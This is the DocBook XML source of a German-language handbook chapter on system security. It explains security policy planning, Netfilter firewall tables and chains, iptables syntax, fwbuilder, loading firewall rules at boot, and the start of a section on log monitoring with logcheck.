<?xml version='1.0' encoding='utf-8' ?>
<!DOCTYPE chapter PUBLIC "-//OASIS//DTD DocBook XML V4.5//EN" "http://www.oasis-open.org/docbook/xml/4.5/docbookx.dtd" [
]>
<chapter id="security">
  <chapterinfo>
    <mediaobject condition="pdf">
      <imageobject>
        <imagedata fileref="images/chap-security.png" scalefit="1" />
      </imageobject>
    </mediaobject>
    <keywordset>
      <keyword>Firewall</keyword>
      <keyword>Netzfilter</keyword>
      <keyword>IDS/NIDS</keyword>
    </keywordset>
  </chapterinfo>
  <title>Sicherheit</title>
  <highlights>
    <para>Ein Informationssystem kann je nach der Umgebung, in der es eingesetzt wird, unterschiedlich wichtig sein. Manchmal ist es für ein Unternehmen lebensnotwendig. Deshalb muss es vor verschiedenen Gefahren geschützt sein. Das Verfahren, bei dem diese Gefahren identifiziert werden und der passende Schutz festgelegt und eingerichtet wird, wird insgesamt als „Sicherheitsprozess“ bezeichnet.</para>
  </highlights>
  <section id="sect.defining-security-policy">
    <title>Festlegen einer Sicherheitsstrategie</title>

    <sidebar>
      <title><emphasis>VORSICHT</emphasis> Anwendungsbereich dieses Kapitels</title>

      <para>IT-Sicherheit ist ein ausgedehntes und sehr heikles Thema. Wir können daher nicht den Anspruch erheben, dies in umfassender Weise in einem einzelnen Kapitel zu beschreiben. Wir werden nur einige wichtige Punkte umreißen und einige Werkzeuge und Methoden beschreiben, die im Sicherheitsbereich von Nutzen sein können. Zur Vertiefung steht umfangreiche Literatur zur Verfügung, ganze Bücher sind diesem Thema gewidmet worden. Ein hervorragender Einstieg wäre zum Beispiel <citetitle>Linux Server Security</citetitle> von Michael D. Bauer (herausgegeben von O'Reilly).</para>
    </sidebar>

    <para>Der Begriff „Sicherheit“ selbst deckt einen weiten Bereich von Konzepten, Werkzeugen und Verfahren ab, von denen jedoch keines allgemein gilt. Um unter ihnen eine Auswahl treffen zu können, muss man eine klare Vorstellung davon haben, was man erreichen möchte. Die Absicherung eines Systems beginnt mit der Beantwortung einiger Fragen. Wenn man überstürzt einen willkürlich ausgewählten Satz von Werkzeugen installiert, läuft man Gefahr, sich auf die falschen Aspekte der Sicherheit zu konzentrieren.</para>

    <para>Als erstes legt man deshalb das Ziel fest. Ein guter Ansatz, der bei dieser Festlegung hilft, beginnt mit den folgenden Fragen:</para>
    <itemizedlist>
      <listitem>
	<para><emphasis>Was</emphasis> wollen wir schützen? Die Sicherheitsrichtlinie wird je nachdem, ob wir Rechner oder Daten schützen wollen, anders aussehen. Bei letzteren müssen wir auch noch wissen, um welche Daten es sich handelt.</para>
      </listitem>
      <listitem>
	<para><emphasis>Wovor</emphasis> wollen wir uns schützen? Ist es der Verlust vertraulicher Daten? Versehentliche Datenverluste? Einnahmeausfälle durch Störungen im Betriebsablauf?</para>
      </listitem>
      <listitem>
	<para>Ferner, <emphasis>vor wem</emphasis> versuchen wir uns zu schützen? Sicherheitsmaßnahmen zum Schutz vor einem Tippfehler eines normalen Benutzers des Systems sind grundverschieden von Maßnahmen zum Schutz vor einer entschlossenen Gruppe von Angreifern.</para>
      </listitem>
    </itemizedlist>

    <para>Der Begriff „Gefahr“ wird normalerweise benutzt, um gleichermaßen von folgenden drei Faktoren zu sprechen: was geschützt werden soll, welches Ereignis verhindert werden soll, und wer versuchen wird, dieses Ereignis eintreten zu lassen. Um die Gefahr abzubilden, müssen alle drei Fragen beantwortet werden. Ausgehend von diesem Risikomodell können dann Sicherheitsrichtlinien erstellt und durch konkrete Maßnahmen umgesetzt werden.</para>

    <sidebar>
      <title><emphasis>HINWEIS</emphasis> Ständiges Infragestellen</title>

      <para>Bruce Schneier, ein weltweit anerkannter Experte in Sicherheitsfragen (nicht nur Computersicherheit), setzt einem der gängigsten Sicherheitsmythen ein Motto entgegen: „Sicherheit ist ein Prozess, kein Produkt.“ Die zu schützenden Güter ändern sich im Laufe der Zeit, genauso wie die Bedrohungen und die Mittel, die potentiellen Angreifern zur Verfügung stehen. Selbst wenn eine Sicherheitsrichtlinie anfänglich einwandfrei gestaltet und umgesetzt war, sollte man sich nie auf seinen Lorbeeren ausruhen. Die Risikokomponenten entwickeln sich weiter, und die Erwiderung auf sie muss sich dementsprechend ebenfalls weiterentwickeln.</para>
    </sidebar>

    <para>Besondere Beschränkungen müssen ebenfalls bedacht werden, da sie den Bereich der möglichen Richtlinien begrenzen können. Wie weit wollen wir gehen, um ein System abzusichern? Diese Frage hat einen wesentlichen Einfluss auf die umzusetzenden Richtlinien. Die Antwort wird allzu oft nur in Form von monetären Kosten gegeben, aber die anderen Elemente sollten ebenfalls berücksichtigt werden, wie zum Beispiel das Maß an Unbequemlichkeit, das den Systembenutzern auferlegt wird, oder Leistungseinbußen.</para>

    <para>Sobald das Risiko abgebildet ist, kann man damit beginnen, sich Gedanken über die eigentlichen Sicherheitsrichtlinien zu machen.</para>

    <sidebar>
      <title><emphasis>HINWEIS</emphasis>Extreme Richtlinien</title>

      <para>Es gibt Fälle, in denen die Wahl der Maßnahmen, die zur Absicherung eines Systems erforderlich sind, äußerst einfach ist.</para>

      <para>Wenn zum Beispiel das zu schützende System nur aus einem gebrauchten Rechner besteht, der lediglich dazu benutzt wird, am Ende des Tages einige Zahlen hinzuzufügen, könnte es durchaus vernünftig sein, sich dafür zu entscheiden, gar nichts Besonderes zu seinem Schutz zu tun. Der Sachwert des Systems ist gering. Der Wert der Daten ist Null, da sie nicht auf dem Rechner gespeichert werden. Ein möglicher Angreifer, der in dieses „System“ einbricht, würde nur eine schwerfällige Rechenmaschine bekommen. Die Kosten zur Absicherung eines solchen Systems wären wahrscheinlich höher als die eines Einbruchs.</para>

      <para>Am anderen Ende des Spektrums möchten wir vielleicht die Vertraulichkeit geheimer Daten unter allen Umständen auf möglichst umfassende Weise schützen. In diesem Fall könnte eine angemessene Aktion darin bestehen, diese Daten vollständig zu vernichten (die Dateien sicher zu löschen, die Festplatten zu schreddern, dann die Partikel in Säure aufzulösen und so weiter). Falls es zusätzlich erforderlich ist, die Daten für eine zukünftige Verwendung zu speichern (wenn auch nicht notwendigerweise auf leicht zugängliche Art), und falls Kosten auch in diesem Fall keine Rolle spielen, könnte ein Ansatzpunkt darin bestehen, die Daten auf Platten aus einer Platin-Iridium-Legierung zu speichern und diese in bombensicheren Bunkern unter verschiedenen Bergen dieser Welt zu lagern, von denen (natürlich) jeder völlig geheim und von ganzen Armeen bewacht wäre…</para>

      <para>So extrem diese Beispiele auch erscheinen mögen, so wären sie dennoch eine angemessene Reaktion auf definierte Risiken, da sie das Ergebnis von Überlegungen sind, bei denen die zu erreichenden Ziele und die einzuhaltenden Restriktionen berücksichtigt wurden. Keine Sicherheitsrichtlinie ist weniger respektabel als eine andere, solange sie auf einer begründeten Entscheidung beruht.</para>
    </sidebar>

    <para>In den meisten Fällen kann das Informationssystem in einheitliche und weitgehend voneinander unabhängige Teilsysteme aufgeteilt werden. Jedes Teilsystem hat seine eigenen Anforderungen und Restriktionen, und daher sollten die Risikoanalyse und die Entwicklung der Sicherheitsrichtlinien für jedes getrennt angegangen werden. Man sollte dabei beachten, dass eine kurze und wohldefinierte Grenzlinie leichter zu verteidigen ist, als eine lange gewundene Grenze. Die Organisation des Netzwerks sollte dementsprechend ausgelegt werden: empfindliche Dienste sollten auf wenigen Rechnern konzentriert sein, und diese sollten nur über möglichst wenige Kontrollpunkte zugänglich sein; es ist einfacher, diese Kontrollpunkte abzusichern, als alle empfindlichen Rechner gegen die gesamte Außenwelt. An dieser Stelle wird die Nützlichkeit von Netzwerkfiltern (einschließlich Firewalls) deutlich. Diese Filterung kann mit dedizierter Hardware realisiert werden, jedoch besteht eine möglicherweise einfachere und flexiblere Lösung darin, eine Firewall-Anwendung, wie sie im Linux-Kernel integriert ist, zu benutzen.</para>
  </section>
  <section id="sect.firewall-packet-filtering">
    <title>Firewall oder Paketfilter</title>
    <indexterm><primary>Firewall</primary></indexterm>
    <indexterm><primary>Paketfilter</primary></indexterm>

    <sidebar>
      <title><emphasis>ZURÜCK ZU DEN GRUNDLAGEN</emphasis> Firewall</title>
      <indexterm><primary>Paket</primary><secondary>IP</secondary></indexterm>

      <para>Eine <emphasis>Firewall</emphasis> ist eine Computereinrichtung aus Hard- oder Software, die ein- und ausgehende Netzwerkpakete (zum lokalen Netzwerk kommend oder von ihm ausgehend) sortiert und nur diejenigen durchlässt, die bestimmte vorher festgelegte Bedingungen erfüllen.</para>
    </sidebar>

    <para>Eine Firewall ist ein filternder Netzübergang und nur bei Paketen wirksam, die durch sie hindurchgehen müssen. Deshalb kann sie nur dann wirksam sein, wenn der Weg durch die Firewall für diese Pakete die einzige Route ist.</para>

    <para>Da es keine Standardkonfiguration gibt (und das Motto „Prozess, nicht Produkt“ gilt), gibt es auch keine schlüsselfertige Lösung. Es gibt jedoch Hilfsprogramme, die die Konfigurierung der <emphasis>Netfilter</emphasis>-Firewall mit einer grafischen Darstellung der Filterregeln vereinfachen. <command>fwbuilder</command> ist zweifellos unter ihnen eines der besten.</para>
    <indexterm><primary><emphasis>Netfilter</emphasis></primary></indexterm>

    <sidebar>
      <title><emphasis>SONDERFALL</emphasis> Lokale Firewall</title>

      <para>Eine Firewall kann auf einen bestimmten Rechner beschränkt sein (im Gegensatz zu einem ganzen Netzwerk), wobei ihre Rolle dann darin besteht, den Zugang zu einigen Diensten zu filtern oder zu beschränken, oder möglicherweise ausgehende Verbindungen von Schadsoftware, die ein Anwender vorsätzlich oder unabsichtlich installiert hat, zu unterbinden.</para>
    </sidebar>

    <para>Der Linux Kernel schließt die <emphasis>Netfilter</emphasis>-Firewall ein. Diese kann aus dem User Space mit den Befehlen <command>iptables</command> und <command>ip6tables</command> gesteuert werden. Der Unterschied zwischen diesen beiden Befehlen besteht darin, dass ersterer auf das IPv4-Netzwerk einwirkt, letzterer auf IPv6. Da beide Netzwerk-Protokoll-Stapel wahrscheinlich noch viele Jahre in Gebrauch sein werden, müssen beide Hilfsprogramme parallel verwendet werden.</para>
    <indexterm><primary><command>iptables</command></primary></indexterm>
    <indexterm><primary><command>ip6tables</command></primary></indexterm>
    <section id="sect.netfilter">
      <title>Verhalten von Netfilter</title>

      <para><emphasis>Netfilter</emphasis> verwendet vier verschiedene Tabellen, in denen Regeln gespeichert werden, die drei Arten von Vorgängen bei Paketen regeln:</para>
      <itemizedlist>
        <listitem>
	  <para><literal>filter</literal> betrifft Filterregeln (ein Paket annehmen, zurückweisen oder ignorieren);</para>
        </listitem>
        <listitem>
	  <para><literal>nat</literal> betrifft die Übersetzung von Quell- oder Zieladressen und der Ports von Paketen;</para>
        </listitem>
        <listitem>
	  <para><literal>mangle</literal> betrifft sonstige Änderungen an den IP-Paketen (einschließlich des ToS — <emphasis>Type of Service</emphasis> — Feldes und seiner Optionen);</para>
        </listitem>
        <listitem>
	  <para><literal>raw</literal> ermöglicht andere manuelle Veränderungen an Paketen, bevor sie das Verbindungsverfolgungssystem erreichen.</para>
        </listitem>
      </itemizedlist>

      <para>Jede Tabelle enthält Regellisten, die <emphasis>Ketten</emphasis> genannt werden. Die Firewall verwendet Standardketten, um Pakete in Abhängigkeit von vorher festgelegten Umständen zu bearbeiten. Der Administrator kann weitere Ketten erstellen, die aber nur benutzt werden, wenn von einer der Standardketten (entweder direkt oder indirekt) auf sie verwiesen wird.</para>
      <indexterm><primary>Kette</primary></indexterm>
      <indexterm><primary>Filterregel</primary></indexterm>

      <para>Die Tabelle <literal>filter</literal> enthält drei Standardketten:</para>
      <itemizedlist>
        <listitem>
	  <para><literal>INPUT</literal>: betrifft Pakete, deren Ziel die Firewall selbst ist;</para>
        </listitem>
        <listitem>
	  <para><literal>OUTPUT</literal>: betrifft Pakete, die von der Firewall ausgesandt werden;</para>
        </listitem>
        <listitem>
	  <para><literal>FORWARD</literal>: betrifft Pakete, die die Firewall durchqueren (die weder ihre Quelle noch ihr Ziel ist).</para>
        </listitem>
      </itemizedlist>

      <para>Die Tabelle <literal>nat</literal> enthält ebenfalls drei Standardketten:</para>
      <itemizedlist>
        <listitem>
	  <para><literal>PREROUTING</literal>: um Pakete zu verändern, sobald sie eintreffen;</para>
        </listitem>
        <listitem>
	  <para><literal>POSTROUTING</literal>: um Pakete zu verändern, wenn sie für die Versendung bereit sind;</para>
        </listitem>
        <listitem>
	  <para><literal>OUTPUT</literal>: um von der Firewall selbst erzeugte Pakete zu verändern.</para>
        </listitem>
      </itemizedlist>

      <figure id="figure.chaines-netfilter">
        <title>Wie <emphasis>Netfilter</emphasis>-Ketten aufgerufen werden</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/netfilter.png" scalefit="1" width="65%" />
          </imageobject>
        </mediaobject>
      </figure>

      <para>Jede Kette ist eine Liste von Regeln; jede Regel besteht aus einem Satz von Bedingungen und einer Aktion, die ausgeführt wird, wenn die Bedingungen erfüllt sind. Wenn ein Paket bearbeitet wird, fragt die Firewall die passende Kette Regel für Regel ab; wenn die Bedingungen einer Regel erfüllt sind, „springt“ (daher die Option <literal>-j</literal> für „jump“ in den Befehlen) sie zu der angegebenen Aktion, um die Bearbeitung dort fortzusetzen. Die gebräuchlichsten Verhaltensweisen sind standardisiert, und es gibt fest zugeordnete Aktionen für sie. Die Ausführung einer dieser Standardaktionen bricht die Bearbeitung der Kette ab, da das Schicksal des Pakets bereits besiegelt ist (abgesehen von einer weiter unten genannten Ausnahme):</para>

      <sidebar>
        <title><emphasis>ZURÜCK ZU DEN GRUNDLAGEN</emphasis> ICMP</title>

	<para>ICMP (<emphasis>Internet Control Message </emphasis>Protocol) ist das Protokoll, das zur Übertragung ergänzender Informationen bei der Datenübertragung verwendet wird. Mit ihm kann die Netzanbindung durch den Befehl <command>ping</command> überprüft werden (der Befehl verschickt eine <emphasis>echo request</emphasis> ICMP-Nachricht, die der Empfänger mit einer <emphasis>echo reply</emphasis> ICMP-Nachricht beantworten soll). Es meldet, ob eine Firewall ein Paket zurückweist, zeigt einen Überlauf in einem Empfangspuffer an, schlägt einen besseren Pfad für die nächsten Pakete in einer Verbindung vor und so weiter. Dieses Protokoll ist durch mehrere RFC-Dokumente definiert; die ursprünglichen Dokumente RFC777 und RFC792 wurden schon bald vervollständigt und erweitert. <ulink type="block" url="http://www.faqs.org/rfcs/rfc777.html" /><ulink type="block" url="http://www.faqs.org/rfcs/rfc792.html" /></para>

	<para>Hinweis: ein Empfangspuffer ist ein kleiner Speicherbereich, der Daten vom Zeitpunkt ihrer Ankunft aus dem Netzwerk bis zum Zeitpunkt ihrer Verarbeitung durch den Kernel speichert. Wenn dieser Bereich voll ist, können keine weiteren Daten empfangen werden, und ICMP meldet das Problem, so dass der Absender seine Übertragungsgeschwindigkeit reduzieren kann (die nach einiger Zeit möglichst ausgeglichen sein sollte).</para>
        <indexterm><primary>ICMP</primary></indexterm>
        <indexterm><primary>Internet Control Message Protocol</primary></indexterm>
        <indexterm><primary>Empfangspuffer</primary></indexterm>
        <indexterm><primary>Puffer</primary><secondary>Empfangspuffer</secondary></indexterm>
        <indexterm><primary><command>ping</command></primary></indexterm>

	<para>Man beachte, dass ein IPv4-Netzwerk zwar ohne ICMP funktionieren kann, dass aber ICMPv6 für ein IPv6-Netzwerk unbedingt erforderlich ist, da es mehrere Funktionen vereint, die in der IPv4-Welt auf ICMPv4, IGMP (<emphasis>Internet Group Membership Protocol</emphasis>) und ARP (<emphasis>Address Resolution Protocol</emphasis>) verteilt waren. ICMPv6 ist in der RFC4443 definiert. <ulink type="block" url="http://www.faqs.org/rfcs/rfc4443.html" /></para>
      </sidebar>

      <para></para>
      <itemizedlist>
        <listitem>
	  <para><literal>ACCEPT</literal>: erlaube dem Paket, seinen Weg fortzusetzen;</para>
        </listitem>
        <listitem>
	  <para><literal>REJECT</literal>: weise das Paket mit einem ICMP-Fehlerpaket zurück (die Option <literal>--reject-with <replaceable>Typ</replaceable></literal> in Verbindung mit dem Befehl <command>iptables</command> ermöglicht es, den Fehlertyp auszuwählen);</para>
        </listitem>
        <listitem>
	  <para><literal>DROP</literal>: lösche (ignoriere) das Paket;</para>
        </listitem>
        <listitem>
	  <para><literal>LOG</literal>: protokolliere (mittels <command>syslogd</command>) eine Meldung mit einer Beschreibung des Pakets; man beachte, dass hierdurch die Verarbeitung nicht abgebrochen wird und die Ausführung der Kette mit der nächsten Regel weitergeht, weshalb das Protokollieren zurückgewiesener Pakete sowohl die LOG-Regel als auch die REJECT/DROP-Regel erfordert;</para>
        </listitem>
        <listitem>
	  <para><literal>ULOG</literal>: protokolliere eine Meldung mittels <command>ulogd</command>, das für die Verarbeitung einer hohen Anzahl von Meldungen anpassungsfähiger und effizienter ist als <command>syslogd</command>; man beachte, dass dieser Vorgang, wie bei LOG, die weitere Verarbeitung an die nächste Regel in der aufrufenden Kette zurückgibt;</para>
        </listitem>
        <listitem>
	  <para><replaceable>ketten_name</replaceable>: springe zu der angegebenen Kette und werte ihre Regeln aus;</para>
        </listitem>
        <listitem>
	  <para><literal>RETURN</literal>: beende die Verarbeitung der aktuellen Kette und kehre zu der aufrufenden Kette zurück; falls die aktuelle Kette eine Standardkette ist, gibt es keine aufrufende Kette, und so wird stattdessen die voreingestellte Aktion (die durch die Option <literal>-P</literal> des Befehls <command>iptables</command> festgelegt wird) ausgeführt;</para>
        </listitem>
        <listitem>
	  <para><literal>SNAT</literal> (nur in der Tabelle <literal>nat</literal>): wende <emphasis>Source NAT</emphasis> an (weitere Optionen beschreiben genau die anzuwendenden Änderungen);</para>
        </listitem>
        <listitem>
	  <para><literal>DNAT</literal> (nur in der Tabelle <literal>nat</literal>): wende <emphasis>Destination NAT</emphasis> an (weitere Optionen beschreiben genau die anzuwendenden Änderungen);</para>
        </listitem>
        <listitem>
	  <para><literal>MASQUERADE</literal> (nur in der Tabelle <literal>nat</literal>): wende <emphasis>masquerading</emphasis> an (ein Sonderfall von <emphasis>Source NAT</emphasis>);</para>
        </listitem>
        <listitem>
	  <para><literal>REDIRECT</literal> (nur in der Tabelle <literal>nat</literal>): lenke das Paket an einen vorgegebenen Port der Firewall selbst um; dies kann dazu benutzt werden, einen transparenten Webproxy aufzusetzen, der auf der Clientseite ohne Konfiguration funktioniert, da der Client davon ausgeht, dass er direkt mit dem Empfänger verbunden ist, während der Nachrichtenaustausch in Wirklichkeit durch den Proxy läuft.</para>
        </listitem>
      </itemizedlist>

      <para>Andere Aktionen, insbesondere solche, die die <literal>mangle</literal>-Tabelle betreffen, liegen außerhalb des Rahmens dieses Textes. Die Handbuchseiten <citerefentry><refentrytitle>iptables</refentrytitle> <manvolnum>8</manvolnum></citerefentry> und <citerefentry><refentrytitle>ip6tables</refentrytitle> <manvolnum>8</manvolnum></citerefentry> enthalten umfangreiche Auflistungen.</para>
    </section>
    <section id="sect.iptables">
      <title>Syntax von <command>iptables</command> und <command>ip6tables</command></title>

      <para>Mit den Befehlen <command>iptables</command> und <command>ip6tables</command> können Tabellen, Ketten und Regeln gehandhabt werden. Ihre Option <literal>-t <replaceable>tabelle</replaceable></literal> zeigt an, welche Tabelle bearbeitet werden soll (die Voreinstellung ist <literal>filter</literal>).</para>
      <indexterm><primary><command>iptables</command></primary></indexterm>
      <indexterm><primary><command>ip6tables</command></primary></indexterm>
      <section id="sect.iptables-command">
        <title>Befehle</title>

	<para>Die Option <literal>-N <replaceable>kette</replaceable></literal> erzeugt eine neue Kette. Die Option <literal>-X <replaceable>kette</replaceable></literal> löscht eine leere und unbenutzte Kette. Die Option <literal>-A <replaceable>kette</replaceable>_<replaceable>regel</replaceable></literal> fügt am Ende der angegebenen Kette eine Regel an. Die Option <literal>-I <replaceable>kette</replaceable> <replaceable>regel_nummer</replaceable><replaceable>regel</replaceable></literal> fügt eine Regel vor der Regel mit der Nummer <replaceable>regel_nummer</replaceable> ein. Die Option <literal>-D <replaceable>kette</replaceable><replaceable>regel_nummer</replaceable></literal> (oder <literal>-D <replaceable>kette</replaceable><replaceable>regel</replaceable></literal>) löscht eine Regel in der Kette; die erste Syntax identifiziert die zu löschende Regel durch ihre Nummer, während letztere sie durch ihren Inhalt identifiziert. Die Option <literal>-F <replaceable>kette</replaceable></literal> leert eine Kette (löscht alle ihre Regeln); wenn keine Kette angegeben wird, werden alle Regeln der Tabelle gelöscht. Die Option <literal>-L <replaceable>kette</replaceable></literal> listet alle Regeln der Kette auf. Schließlich legt die Option <literal>-P <replaceable>kette</replaceable>_<replaceable>aktion</replaceable></literal> die voreingestellte Aktion oder „Richtlinie“ einer gegebenen Kette fest; man beachte, dass nur Standardketten eine derartige Richtlinie haben können.</para>
      </section>
      <section id="sect.iptables-rules">
        <title>Regeln</title>
        <indexterm><primary>Filterregel</primary></indexterm>

	<para>Jede Regel wird in der Form <literal><replaceable>bedingungen</replaceable> -j <replaceable>aktion</replaceable><replaceable>aktions_optionen</replaceable></literal> dargestellt. Werden mehrere Bedingungen in derselben Regel angegeben, dann ist das Kriterium die Verknüpfung (das logische <emphasis>und</emphasis>) der Bedingungen, die wenigstens so restriktiv ist wie jede einzelne Bedingung.</para>

	<para>Die Bedingung <literal>-p <replaceable>protokoll</replaceable></literal> vergleicht das Protokollfeld des IP-Pakets. Die häufigsten Werte sind <literal>tcp</literal>, <literal>udp</literal>, <literal>icmp</literal> und <literal>icmpv6</literal>. Ein vorangestelltes Ausrufezeichen kehrt die Bedingung um, die dann dem Ausdruck „alle Pakete mit einem anderen als dem angegebenen Protokoll“ entspricht. Dieser Umkehrungsmechanismus ist nicht auf die Option <literal>-p</literal> beschränkt, sondern kann auch auf alle anderen Bedingungen angewendet werden.</para>

	<para>Die Bedingung <literal>-s <replaceable>adresse</replaceable></literal> oder <literal>-s <replaceable>network/mask</replaceable></literal> vergleicht die Quelladresse des Pakets. Dementsprechend vergleicht die Bedingung <literal>-d <replaceable>adresse</replaceable></literal> oder <literal>-d <replaceable>network/mask</replaceable></literal> die Zieladresse.</para>

	<para>Die Bedingung <literal>-i <replaceable>schnittstelle</replaceable></literal> wählt Pakete, die von der angegebenen Netzwerkschnittstelle kommen. <literal>-o <replaceable>schnittstelle</replaceable></literal> wählt Pakete, die von einer bestimmten Schnittstelle abgehen.</para>

	<para>Es gibt genauere Bedingungen in Abhängigkeit von den oben beschriebenen allgemeinen Bedingungen. So kann zum Beispiel die Bedingung <literal>-p tcp</literal> um Bedingungen für die TCP-Ports ergänzt werden durch Ausdrücke wie <literal>--source-port <replaceable>port</replaceable></literal> und <literal>--destination-port <replaceable>port</replaceable></literal>.</para>

	<para>Die Bedingung <literal>--state <replaceable>status</replaceable></literal> vergleicht den Status eines Pakets in einer Verbindung (hierbei ist das Kernelmodul <command>ipt_conntrack</command> zur Verbindungsverfolgung erforderlich). Der Status <literal>NEW</literal> bezeichnet ein Paket, das eine neue Verbindung eröffnet; <literal>ESTABLISHED</literal> gilt für Pakete, die zu einer bereits bestehenden Verbindung gehören, und <literal>RELATED</literal> entspricht Paketen, die eine neue Verbindung im Zusammenhang mit einer bestehenden eröffnen (dies ist nützlich für die <literal>ftp-data</literal>-Verbindungen im „aktiven“ Modus des FTP-Protokolls).</para>

	<para>Der vorstehende Abschnitt führt verfügbare Aktionen auf, aber nicht ihre jeweiligen Optionen. Die Aktion <literal>LOG</literal> hat zum Beispiel folgende Optionen:</para>
        <itemizedlist>
          <listitem>
	    <para><literal>--log-level</literal>, mit dem voreingestellten Wert <literal>warning</literal>, gibt die Priorität des <command>syslog</command>-Schweregrads an;</para>
          </listitem>
          <listitem>
	    <para><literal>--log-prefix</literal> ermöglicht es, einen Text-Vorspann festzulegen, um protokollierte Meldungen unterscheiden zu können;</para>
          </listitem>
          <listitem>
	    <para><literal>--log-tcp-sequence</literal>, <literal>--log-tcp-options</literal> und <literal>--log-ip-options</literal> kennzeichnen zusätzliche Daten zur Einbindung in die Meldung, und zwar die TCP-Sequenznummer, die TCP-Optionen und die IP-Optionen.</para>
          </listitem>
        </itemizedlist>

	<para>Die Aktion <literal>DNAT</literal> bietet die Option <literal>--to-destination <replaceable>addresse</replaceable>:<replaceable>port</replaceable></literal> an, mit der die neue IP-Zieladresse und der neue Zielport gekennzeichnet werden. Genauso bietet <literal>SNAT</literal> die Option  <literal>--to-source <replaceable>addresse</replaceable>:<replaceable>port</replaceable></literal> an, mit der die neue IP-Quelladresse und der neue Quellport gekennzeichnet werden.</para>

	<para>Die Aktion <literal>REDIRECT</literal> (nur wenn NAT verfügbar ist) bietet die Option <literal>--to-ports <replaceable>port(s)</replaceable></literal> an, mit der der Port oder der Portbereich gekennzeichnet werden, an den die Pakete umgelenkt werden sollen.</para>
      </section>
    </section>
    <section id="sect.creating-rules">
      <title>Regeln erstellen</title>

      <para>Für jede erstellte Regel muss jedes Mal <command>iptables</command>/<command>ip6tables</command> aufgerufen werden. Da es mühsam ist, diese Befehle von Hand einzugeben, werden sie normalerweise in einem Skript gespeichert, so dass bei jedem Rechnerstart automatisch dieselbe Konfiguration eingerichtet wird. Dieses Skript kann von Hand geschrieben werden, aber es kann auch interessant sein, es mit einem hochentwickelten Hilfsprogramm wie <command>fwbuilder</command> zu erstellen.</para>

      
      <screen>
<computeroutput># </computeroutput><userinput>apt install fwbuilder</userinput></screen>

      <para>Das Prinzip ist einfach. Zunächst müssen alle Elemente beschrieben werden, die in den eigentlichen Regeln enthalten sein werden:</para>
      <itemizedlist>
        <listitem>
	  <para>die Firewall selbst mit ihren Netzwerkschnittstellen;</para>
        </listitem>
        <listitem>
	  <para>die Netzwerke mit ihren jeweiligen IP-Bereichen;</para>
        </listitem>
        <listitem>
	  <para>die Server;</para>
        </listitem>
        <listitem>
	  <para>die Ports, die zu den auf den Servern untergebrachten Diensten gehören.</para>
        </listitem>
      </itemizedlist>

      <para>Die Regeln werden dann durch einfaches Ziehen und Ablegen auf die Objekte erstellt. Über einige kontextbezogene Menüs kann die Bedingung geändert (zum Beispiel umgekehrt) werden. Anschließend muss die Aktion ausgewählt und konfiguriert werden.</para>

      <para>Was IPv6 betrifft, so kann man entweder zwei verschiedene Regelsätze für IPv4 und IPv6 erstellen, oder nur einen und <command>fwbuilder</command> die Regeln je nach den Adressen, die den Objekten zugewiesen sind, übersetzen lassen.</para>

      <figure id="figure.fwbuilder">
        <title>Das Hauptfenster des Fwbuilder</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/fwbuilder.png" scalefit="1" />
          </imageobject>
        </mediaobject>
      </figure>
      <indexterm><primary><command>fwbuilder</command></primary></indexterm>

      <para><command>fwbuilder</command> kann dann ein Skript zur Konfigurierung der Firewall in Übereinstimmung mit den festgelegten Regeln erstellen. Seine modulare Architekt bietet die Möglichkeit, Skripte für unterschiedliche Systeme zu erstellen (<command>iptables</command> für Linux, <command>ipf</command> für FreeBSD und <command>pf</command> für OpenBSD).</para>

    </section>
    <section id="sect.install-rules-at-boot">
      <title>Die Regeln bei jedem Rechnerstart installieren</title>

      <para>In anderen Fällen besteht der empfohlene Weg darin, das Konfigurationsskript in einer <literal>up</literal>-Anweisung der Datei <filename>/etc/network/interfaces</filename> einzutragen. Im folgenden Beispiel ist das Skript unter <filename>/usr/local/etc/arrakis.fw</filename> gespeichert.</para>

      <example id="example.network-interfaces-firewall">
        <title>Aufruf eines Firewallskripts durch eine <filename>interfaces</filename>-Datei</title>

        <programlisting>auto eth0
iface eth0 inet static
    address 192.168.0.1
    network 192.168.0.0
    netmask 255.255.255.0
    broadcast 192.168.0.255
    up /usr/local/etc/arrakis.fw</programlisting>
      </example>
      <para>Dies setzt natürlich voraus, dass Sie <emphasis role="pkg">ifupdown</emphasis> verwenden, um die Netzwerk-Schnittstellen zu konfigurieren. Wenn Sie etwas anderes (wie <emphasis>NetworkManager</emphasis> oder <emphasis>Systemd Networkd</emphasis>) verwenden, dann suchen Sie in der Dokumentation Möglichkeiten ein Skript auszuführen, nachdem die Schnittstelle hochgefahren wurde.</para>

    </section>
  </section>
  <section id="sect.supervision">
    <title>Überwachung: Vorbeugung, Entdeckung, Abschreckung</title>
    <indexterm><primary>Monitoring</primary></indexterm>

    <para>Monitoring ist aus mehreren Gründen ein integraler Bestandteil jeder Sicherheitsrichtlinie. Unter anderem deshalb, weil das Ziel der Absicherung gewöhnlich nicht darauf beschränkt ist, die Vertraulichkeit der Daten sicherzustellen, sondern auch vorsieht, dass die Verfügbarkeit der Dienste gewährleistet ist. Es ist daher unerlässlich, zu überprüfen, ob alles wie vorgesehen funktioniert, und rechtzeitig jedes abweichende Verhalten und jede Änderung in der Qualität der erbrachten Leistungen zu erkennen. Monitoring hilft dabei Einbruchsversuche zu entdecken und darauf schnell zu reagieren, bevor sie ernste Folgen haben. Dieser Abschnitt gibt einen Überblick über einige Hilfsprogramme, die zur Überwachung verschiedener Aspekte eines Debian-Systems eingesetzt werden können. Damit vervollständigt er <xref linkend="sect.monitoring" />.</para>
    <section id="sect.logcheck">
      <title>Protokolle mit <command>logcheck</command> verfolgen</title>
      <indexterm><primary><command>logcheck</command></primary></indexterm>
      <indexterm><primary>Protokolle</primary><secondary>Monitoring</secondary></indexterm>
      <indexterm><primary>Monitoring</primary><secondary>Protokolldateien</secondary></indexterm>

      <para>Das Programm <command>logcheck</command> überwacht Protokolldateien standardmäßig jede Stunde. Es schickt E-Mails mit ungewöhnlichen Protokollmeldungen zur weiteren Analyse an den Administrator.</para>

      <para>Die Liste der überwachten Dateien wird in <filename>/etc/logcheck/logcheck.logfiles</filename> gespeichert; die Standardeinstellungen eignen sich gut, solange die Datei <filename>/etc/rsyslog.conf</filename> nicht vollständig verändert worden ist.</para>

